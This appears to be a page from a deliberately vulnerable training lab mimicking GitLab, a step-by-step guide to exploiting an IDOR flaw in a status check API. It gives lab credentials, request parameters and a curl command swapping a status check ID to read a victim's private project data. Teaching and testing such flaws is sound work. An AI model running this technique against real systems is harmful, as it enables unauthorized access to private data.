<?php require_once 'config.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploitation Guide - IDOR Documentation</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; color: #e0e0e0; }
        .header { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(252, 109, 38, 0.3); padding: 1rem 2rem; position: sticky; top: 0; z-index: 100; }
        .header-content { max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
        .logo { display: flex; align-items: center; gap: 0.75rem; font-size: 1.3rem; font-weight: bold; color: #fc6d26; text-decoration: none; }
        .logo svg { width: 32px; height: 32px; }
        .nav-links { display: flex; gap: 1.5rem; align-items: center; }
        .nav-links a { color: #e0e0e0; text-decoration: none; }
        .nav-links a:hover { color: #fc6d26; }
        .layout { display: flex; max-width: 1400px; margin: 0 auto; }
        .sidebar { width: 280px; min-height: calc(100vh - 60px); background: rgba(0, 0, 0, 0.3); border-right: 1px solid rgba(252, 109, 38, 0.2); padding: 1.5rem; position: sticky; top: 60px; height: calc(100vh - 60px); overflow-y: auto; }
        .sidebar h3 { color: #fc6d26; font-size: 0.85rem; text-transform: uppercase; margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid rgba(252, 109, 38, 0.3); }
        .sidebar-nav { list-style: none; }
        .sidebar-nav li { margin-bottom: 0.25rem; }
        .sidebar-nav a { display: block; padding: 0.6rem 1rem; color: #aaa; text-decoration: none; border-radius: 8px; transition: all 0.3s; font-size: 0.9rem; }
        .sidebar-nav a:hover { background: rgba(252, 109, 38, 0.1); color: #fc6d26; }
        .sidebar-nav a.active { background: rgba(252, 109, 38, 0.2); color: #fc6d26; font-weight: 500; }
        .sidebar-nav .section-title { color: #666; font-size: 0.75rem; text-transform: uppercase; padding: 1rem 1rem 0.5rem; margin-top: 0.5rem; }
        .content { flex: 1; padding: 2rem 3rem; max-width: 900px; }
        .content h1 { color: #fc6d26; font-size: 2rem; margin-bottom: 0.5rem; }
        .content h2 { color: #fc6d26; font-size: 1.5rem; margin: 2rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid rgba(252, 109, 38, 0.3); }
        .content h3 { color: #e0e0e0; font-size: 1.2rem; margin: 1.5rem 0 0.75rem; }
        .content p { color: #aaa; line-height: 1.8; margin-bottom: 1rem; }
        .content ul, .content ol { color: #aaa; line-height: 1.8; margin-bottom: 1rem; padding-left: 1.5rem; }
        .content li { margin-bottom: 0.5rem; }
        .content code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.4rem; border-radius: 4px; color: #88ff88; font-family: 'Consolas', monospace; font-size: 0.9em; }
        .code-block { background: #0d0d0d; border: 1px solid #333; border-radius: 10px; padding: 1.25rem; font-family: 'Consolas', monospace; font-size: 0.85rem; color: #88ff88; overflow-x: auto; margin: 1rem 0; line-height: 1.6; }
        .code-block .comment { color: #666; }
        .code-block .vulnerable { color: #ff6666; }
        .code-block .highlight { color: #fc6d26; }
        .info-box { border-radius: 10px; padding: 1rem 1.25rem; margin: 1rem 0; }
        .info-box.warning { background: rgba(255, 170, 0, 0.1); border: 1px solid rgba(255, 170, 0, 0.3); }
        .info-box.danger { background: rgba(255, 68, 68, 0.1); border: 1px solid rgba(255, 68, 68, 0.3); }
        .info-box.success { background: rgba(0, 200, 100, 0.1); border: 1px solid rgba(0, 200, 100, 0.3); }
        .info-box.info { background: rgba(252, 109, 38, 0.1); border: 1px solid rgba(252, 109, 38, 0.3); }
        .info-box h4 { margin-bottom: 0.5rem; }
        .info-box.warning h4 { color: #ffaa00; }
        .info-box.danger h4 { color: #ff6666; }
        .info-box.success h4 { color: #66ff99; }
        .info-box.info h4 { color: #fc6d26; }
        .info-box p { margin-bottom: 0; }
        .nav-buttons { display: flex; justify-content: space-between; margin-top: 3rem; padding-top: 1.5rem; border-top: 1px solid rgba(255, 255, 255, 0.1); }
        .nav-btn { padding: 0.75rem 1.5rem; background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(252, 109, 38, 0.3); border-radius: 8px; color: #ccc; text-decoration: none; transition: all 0.3s; }
        .nav-btn:hover { background: rgba(252, 109, 38, 0.2); color: #fc6d26; }
        .step-card { background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(252, 109, 38, 0.2); border-radius: 12px; padding: 1.5rem; margin: 1rem 0; }
        .step-card h3 { color: #fc6d26; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.75rem; }
        .step-num { background: linear-gradient(135deg, #fc6d26, #e24329); width: 2rem; height: 2rem; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 0.9rem; }
        @media (max-width: 900px) { .sidebar { display: none; } .content { padding: 1.5rem; } }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <a href="index.php" class="logo">
                <svg viewBox="0 0 32 32" fill="none">
                    <path d="M16 2L2 12l14 18 14-18L16 2z" fill="#fc6d26"/>
                    <path d="M16 2L2 12h28L16 2z" fill="#e24329"/>
                    <path d="M16 30L2 12l4.5 18H16z" fill="#fca326"/>
                    <path d="M16 30l14-18-4.5 18H16z" fill="#fca326"/>
                </svg>
                GitLab
            </a>
            <nav class="nav-links">
                <a href="index.php">Lab Home</a>
                <a href="login.php">Login</a>
                <a href="../index.php">All Labs</a>
            </nav>
        </div>
    </header>

    <div class="layout">
        <aside class="sidebar">
            <h3>üìö Documentation</h3>
            <ul class="sidebar-nav">
                <li><a href="docs.php">Overview</a></li>
                <li class="section-title">Understanding</li>
                <li><a href="docs-vulnerability.php">The Vulnerability</a></li>
                <li><a href="docs-exploitation.php" class="active">Exploitation Guide</a></li>
                <li class="section-title">Defense</li>
                <li><a href="docs-prevention.php">Prevention</a></li>
                <li><a href="docs-testing.php">Testing Techniques</a></li>
                <li class="section-title">Resources</li>
                <li><a href="docs-references.php">References</a></li>
            </ul>
        </aside>

        <main class="content">
            <h1>Exploitation Guide</h1>
            <p>Step-by-step instructions to exploit the IDOR vulnerability and leak private project data.</p>

            <div class="info-box warning">
                <h4>‚ö†Ô∏è Educational Purpose Only</h4>
                <p>This guide is for learning about security vulnerabilities in a controlled lab environment. Never attempt these techniques on systems without authorization.</p>
            </div>

            <h2>Prerequisites</h2>
            <ul>
                <li>Access to the lab environment</li>
                <li>Credentials: <code>attacker01 / attacker123</code></li>
                <li>Basic understanding of HTTP requests and APIs</li>
            </ul>

            <h2>Exploitation Steps</h2>

            <div class="step-card">
                <h3><span class="step-num">1</span> Login as the Attacker</h3>
                <p>Navigate to the <a href="login.php" style="color: #fc6d26;">login page</a> and authenticate with:</p>
                <div class="code-block">
Username: attacker01
Password: attacker123
                </div>
                <p>This account has access to public projects and can create API tokens.</p>
            </div>

            <div class="step-card">
                <h3><span class="step-num">2</span> Create a Personal Access Token</h3>
                <p>Go to <a href="tokens.php" style="color: #fc6d26;">Access Tokens</a> page and create a new token:</p>
                <ul>
                    <li>Enter a name like "Exploit Token"</li>
                    <li>Select the <code>api</code> scope</li>
                    <li>Click "Create Token"</li>
                    <li>Copy the generated token (starts with <code>glpat-</code>)</li>
                </ul>
            </div>

            <div class="step-card">
                <h3><span class="step-num">3</span> Identify Your Project</h3>
                <p>Check your <a href="dashboard.php" style="color: #fc6d26;">dashboard</a> for your accessible projects:</p>
                <ul>
                    <li><strong>Malicious Tools</strong> (ID: 3) - Your primary project</li>
                    <li><strong>Phishing Kit</strong> (ID: 4) - Another project you own</li>
                </ul>
                <p>These projects have their own status checks (IDs 4 and 5).</p>
            </div>

            <div class="step-card">
                <h3><span class="step-num">4</span> Open the API Tester</h3>
                <p>Navigate to the <a href="api-test.php" style="color: #fc6d26;">API Tester</a> page. This provides an interactive interface to send API requests.</p>
            </div>

            <div class="step-card">
                <h3><span class="step-num">5</span> Configure the Legitimate Request</h3>
                <p>First, test a legitimate request to your own status check:</p>
                <div class="code-block">
Authorization: Bearer <span class="highlight">[your-token]</span>
project_id: <span class="highlight">3</span>              <span class="comment">// Your project</span>
merge_request_iid: <span class="highlight">1</span>
sha: <span class="highlight">abc123def456</span>
external_status_check_id: <span class="highlight">4</span>  <span class="comment">// Your status check</span>
                </div>
                <p>This should return your project's status check information.</p>
            </div>

            <div class="step-card">
                <h3><span class="step-num">6</span> Exploit the IDOR</h3>
                <p>Now change the <code>external_status_check_id</code> to access victim's data:</p>
                <div class="code-block">
Authorization: Bearer <span class="highlight">[your-token]</span>
project_id: <span class="highlight">3</span>              <span class="comment">// Keep YOUR project</span>
merge_request_iid: <span class="highlight">1</span>
sha: <span class="highlight">abc123def456</span>
external_status_check_id: <span class="vulnerable">1</span>  <span class="comment">// VICTIM's status check!</span>
                </div>
                <div class="info-box danger">
                    <h4>üîì The Key</h4>
                    <p>Change <code>external_status_check_id</code> from your own (4 or 5) to victim's (1 or 2). The API doesn't validate that check ID 1 belongs to project ID 3!</p>
                </div>
            </div>

            <div class="step-card">
                <h3><span class="step-num">7</span> Analyze the Response</h3>
                <p>A successful exploit returns sensitive data from the private project:</p>
                <div class="code-block">
{
  "id": 1,
  "name": "AWS Deployment Validator",
  <span class="vulnerable">"project": {
    "id": 1,
    "name": "Confidential Infrastructure",
    "visibility": "private",
    "owner": "victim01"
  }</span>,
  <span class="vulnerable">"external_url": "https://aws-validator.internal.corp.local/api/validate?key=secret_aws_key_12345"</span>,
  "protected_branch": "main",
  "_debug": {
    "cross_project_access": <span class="vulnerable">"YES - IDOR DETECTED!"</span>
  }
}
                </div>
            </div>

            <h2>Status Check ID Reference</h2>
            <p>Here's a mapping of status check IDs to their projects:</p>
            <div class="code-block">
<span class="comment">// PRIVATE PROJECT STATUS CHECKS (victim01)</span>
ID 1: AWS Deployment Validator      ‚Üí <span class="vulnerable">Confidential Infrastructure (PRIVATE)</span>
ID 2: Security Scanner              ‚Üí <span class="vulnerable">Secret Research (PRIVATE)</span>

<span class="comment">// PUBLIC/ATTACKER STATUS CHECKS</span>
ID 3: CI Pipeline Checker           ‚Üí Open Source Project (PUBLIC)
ID 4: Basic Validator               ‚Üí Malicious Tools (attacker01)
ID 5: Code Quality Check            ‚Üí Phishing Kit (attacker01)
            </div>

            <h2>cURL Command Example</h2>
            <p>You can also exploit this using cURL from the command line:</p>
            <div class="code-block">
curl -X POST "http://localhost/AC/lab17/api/status_check_responses.php" \
  -H "Authorization: Bearer glpat-your-token-here" \
  -d "project_id=3" \
  -d "merge_request_iid=1" \
  -d "sha=abc123" \
  -d "<span class="vulnerable">external_status_check_id=1</span>"
            </div>

            <div class="info-box success">
                <h4>‚úì Success Indicator</h4>
                <p>When you see <code>"cross_project_access": "YES - IDOR DETECTED!"</code> and private project information in the response, you've successfully exploited the vulnerability!</p>
            </div>

            <div class="nav-buttons">
                <a href="docs-vulnerability.php" class="nav-btn">‚Üê The Vulnerability</a>
                <a href="docs-prevention.php" class="nav-btn">Next: Prevention ‚Üí</a>
            </div>
        </main>
    </div>
</body>
</html>
